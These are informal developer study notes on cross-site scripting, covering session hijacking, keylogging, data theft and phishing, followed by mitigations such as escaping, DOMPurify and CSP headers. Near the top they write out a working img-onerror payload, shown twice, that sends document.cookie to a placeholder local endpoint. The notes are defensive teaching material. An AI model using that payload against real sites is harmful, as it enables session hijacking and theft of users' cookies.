#### XXS

#### [Vulnerabilities]

## User Sesson Hijack
- When we are reading someting from url using search params, a random script can be added to our url in place of name which can execute a sciprt and steal our data.

- Now a days browsers are smart to not allow script tag to be added to url but, there are still hacks that can be done.
- eg <img src=\"does-not-exits\" onerror=\"var img=document.createElement(\'img\') img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector(\'body\').appendChild(img);\">

[encodeURIComponent("<img src=\"does-not-exits\" onerror=\"var img=document.createElement('img') img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector('body').appendChild(img);\">")]

- and pass above to url ?name="malicious script"
- the script executes and reads our cookies which is sensitive data.

## Unauthorized activities
- OR, hacker may execute some function (API) written inside you code with malicious information. As it is your code it will have all authorization and access and will execute successfully

## Capturing keystroke
- Or, Hacker can add script to track all key press events and get all data user is typing, which maybe be sensitive. eg password

## Stealing critical Information
- Hacker can write script to pass entire document.body.innerHTML to some malicious endpoint, whcih may pass critical information along

## phishing attact
- Hacker and insert their own html in DOM which may look very much similar to original, eg a form which takes login credentials

### [Mitigation]

## List all possible ways to take you input

## Use innerText or textContent in place of innerHTML - innerText will be pritext as syntax and not js code or dom element, it will be printed as norml string

## New modal of browser takes care of not executing script inject from url, it will be present but not execute, for older browser we need to handle by using innerText/textContent

## Use escaping mechnaism eg - const sanitizedName - name.replace(/</g, '&lt;').replace(/>/g, '&gt;') this will make any scipt inject to iur system non executable, the inject script will not be taken as dom element on execution but a string

## Using library React, all this sanitization is done behind the scene by React and other libraries for security purpose. This is provided out of the box.

## avaoid dangerouslysetinnerhtml, React allows this but should be avoided as they can be harmful. Use DOMPurify to sanitize your data if necessary.

## Use DOMPurify to sanitize your data DOMPurify.sanitize(name)

## CSP Headers (Content Security Policy Headers) - it can be ser on server, decided what type of resources can be loaded and from where all it can be loaded, to avoid injection form third party. Event handling which script to inject can be handled.

- Decide Allowed Sources
- Script Nonces
- Report only mode, - form where and how many places attackes are being tried

## Avoid using eval - it executes any code indside it, an be harmful